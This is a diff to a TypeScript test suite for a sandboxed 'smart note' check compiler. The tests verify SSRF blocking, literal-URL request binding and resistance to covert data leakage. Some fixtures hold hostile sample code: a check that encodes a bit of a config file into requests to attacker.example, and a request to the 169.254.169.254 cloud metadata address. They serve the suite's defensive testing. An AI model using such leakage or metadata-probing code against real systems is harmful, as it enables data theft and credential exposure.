@@ -8,8 +8,8 @@ import type { PluginContext } from "../../../plugin/types";
 import { _resetKeepSubagentsForTesting, setKeepSubagents } from "../../../shared/keep-subagents";
 import { createSmartNoteCapabilities, type SmartNoteCapabilityApi } from "./capabilities";
 import {
+    bindDeclaredRequests,
     compileSmartNoteCheck,
-    enforceLiteralCapabilityArguments,
     manifestAdvisoryWarnings,
     normalizeCompiledCheck,
     normalizeCron,
@@ -17,6 +17,7 @@ import {
     parseCompilerOutput,
 } from "./compiler";
 import { runCompiledSmartNoteCheck } from "./sandbox-runner";
+import { SmartNoteNetworkError } from "./types";
 
 const fakeCap: SmartNoteCapabilityApi = {
     readFile: async (filePath) => (filePath === "ready.txt" ? "ready" : null),
@@ -204,6 +205,52 @@ describe("compileSmartNoteCheck", () => {
         expect(client.session.prompt).toHaveBeenCalledTimes(1);
     });
 
+    test("accepts a check whose declared host is unreachable, with the dry run pending", async () => {
+        const httpGet = mock(async () => {
+            throw new SmartNoteNetworkError("SMART_NOTE_NETWORK: connect ECONNREFUSED");
+        });
+        const client = createCompilerClient([
+            compilerOutput(
+                `function check(cap) { return { met: cap.httpGet("https://down.example/health").status === 200 }; }`,
+            ),
+        ]);
+
+        const result = await compileSmartNoteCheck(
+            compileArgs(client, {
+                capabilityFactory: () => ({ ...fakeCap, httpGet }),
+                fallbackModels: ["fallback/model"],
+            }),
+        );
+
+        expect(result.ok).toBe(true);
+        if (result.ok) {
+            expect(result.dryRun).toBeNull();
+            expect(result.dryRunNetworkError).toContain("ECONNREFUSED");
+            expect(result.checkHash).toHaveLength(64);
+        }
+        expect(client.session.prompt).toHaveBeenCalledTimes(1);
+    });
+
+    test("still fails a check whose declared URL the SSRF guard refuses", async () => {
+        const client = createCompilerClient([
+            compilerOutput(
+                `function check(cap) { cap.httpGet("https://169.254.169.254/latest/meta-data/"); return { met: true }; }`,
+            ),
+        ]);
+
+        const result = await withTempDir((dir) =>
+            compileSmartNoteCheck(
+                compileArgs(client, {
+                    capabilityFactory: (signal) =>
+                        createSmartNoteCapabilities({ projectRoot: dir, signal }),
+                }),
+            ),
+        );
+
+        expect(result.ok).toBe(false);
+        if (!result.ok) expect(result.error).toContain("internal address");
+    });
+
     test("rejects a computed httpGet URL before any code runs", async () => {
         const httpGet = mock(async () => ({ status: 200, body: "ok" }));
         const client = createCompilerClient([
@@ -250,48 +297,69 @@ describe("compileSmartNoteCheck", () => {
     });
 });
 
-describe("enforceLiteralCapabilityArguments", () => {
-    test("passes literal arguments through and refuses computed ones", async () => {
+describe("bindDeclaredRequests", () => {
+    const signal = () => new AbortController().signal;
+
+    test("fetches every literal URL before the guest runs and serves only those", async () => {
         const readFile = mock(async (filePath: string) => (filePath === "a.txt" ? "A" : null));
-        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
+        const httpGet = mock(async (url: string) => ({ status: 200, body: url }));
         const code = `function check(cap) {
             cap.readFile("a.txt");
-            cap.httpGet('https://example.com/status');
+            if (false) cap.httpGet('https://example.com/never');
             cap.httpGet(\`https://example.com/tpl\`);
             return { met: true };
         }`;
-        const cap = enforceLiteralCapabilityArguments(code, () => ({
-            ...fakeCap,
-            readFile,
-            httpGet,
-        }))(new AbortController().signal);
 
+        const factory = await bindDeclaredRequests(
+            code,
+            () => ({ ...fakeCap, readFile, httpGet }),
+            signal(),
+        );
+        expect(httpGet).toHaveBeenCalledTimes(2);
+        expect(new Set(httpGet.mock.calls.map((call) => call[0]))).toEqual(
+            new Set(["https://example.com/never", "https://example.com/tpl"]),
+        );
+
+        const cap = factory(signal());
         await expect(cap.readFile("a.txt")).resolves.toBe("A");
-        await expect(cap.httpGet("https://example.com/status")).resolves.toEqual({
+        await expect(cap.httpGet("https://example.com/never")).resolves.toEqual({
             status: 200,
-            body: "ok",
-        });
-        await expect(cap.httpGet("https://example.com/tpl")).resolves.toEqual({
-            status: 200,
-            body: "ok",
+            body: "https://example.com/never",
         });
         await expect(cap.readFile("b.txt")).rejects.toThrow(/not a string literal/);
-        await expect(cap.httpGet("https://example.com/status?x=1")).rejects.toThrow(
+        await expect(cap.httpGet("https://example.com/tpl?x=1")).rejects.toThrow(
             /not a string literal/,
         );
-        expect(readFile).toHaveBeenCalledTimes(1);
         expect(httpGet).toHaveBeenCalledTimes(2);
+        expect(readFile).toHaveBeenCalledTimes(1);
     });
 
-    test("fails closed when the check names its parameter something other than cap", async () => {
-        const readFile = mock(async () => "ready");
-        const code = `function check(c) { return { met: c.readFile("ready.txt") === "ready" }; }`;
-        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, readFile }))(
-            new AbortController().signal,
-        );
+    test("makes the request set independent of file contents and control flow", async () => {
+        const httpGet = mock(async (url: string) => ({ status: 200, body: url }));
+        const code = `function check(cap) {
+            const bit = (cap.readFile("config.txt") || "").length & 1;
+            if (bit) cap.httpGet("https://attacker.example/1"); else cap.httpGet("https://attacker.example/0");
+            return { met: true };
+        }`;
+        const requestsFor = async (config: string) => {
+            httpGet.mockClear();
+            const factory = await bindDeclaredRequests(
+                code,
+                () => ({ ...fakeCap, readFile: async () => config, httpGet }),
+                signal(),
+            );
+            const result = await runCompiledSmartNoteCheck({
+                compiledCheck: code,
+                capabilityFactory: factory,
+            });
+            expect(result.ok).toBe(true);
+            return httpGet.mock.calls.map((call) => call[0]).sort();
+        };
 
-        await expect(cap.readFile("ready.txt")).rejects.toThrow(/not a string literal/);
-        expect(readFile).not.toHaveBeenCalled();
+        const even = await requestsFor("ab");
+        const odd = await requestsFor("abc");
+        expect(even).toEqual(["https://attacker.example/0", "https://attacker.example/1"]);
+        expect(odd).toEqual(even);
     });
 
     test("does not admit decoy call sites written in comments or strings", async () => {
@@ -302,8 +370,8 @@ describe("enforceLiteralCapabilityArguments", () => {
             const note = 'cap.httpGet("https://attacker.example/2")';
             return { met: note.length > 0 };
         }`;
-        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, httpGet }))(
-            new AbortController().signal,
+        const cap = (await bindDeclaredRequests(code, () => ({ ...fakeCap, httpGet }), signal()))(
+            signal(),
         );
 
         for (const url of [
@@ -314,6 +382,25 @@ describe("enforceLiteralCapabilityArguments", () => {
             await expect(cap.httpGet(url)).rejects.toThrow(/not a string literal/);
         }
         expect(httpGet).not.toHaveBeenCalled();
+    });
+
+    test("stores a fetch failure and rethrows it from the guest call", async () => {
+        const unreachable = new SmartNoteNetworkError("SMART_NOTE_NETWORK: connect ECONNREFUSED");
+        const code = `function check(cap) { cap.httpGet("https://down.example/"); return { met: true }; }`;
+        const cap = (
+            await bindDeclaredRequests(
+                code,
+                () => ({
+                    ...fakeCap,
+                    httpGet: async () => {
+                        throw unreachable;
+                    },
+                }),
+                signal(),
+            )
+        )(signal());
+
+        await expect(cap.httpGet("https://down.example/")).rejects.toBe(unreachable);
     });
 });
 
@@ -485,6 +572,10 @@ describe("smart-note compiler output bounds", () => {
                     g(bit ? "https://a/1" : "https://a/0");
                     return { met: true };
                 }`,
+                /only be called directly/,
+            ],
+            [
+                `function check(cap) { let n = 0, get; n++ / (get = cap.httpGet) / 1; return { met: true }; }`,
                 /only be called directly/,
             ],
         ];
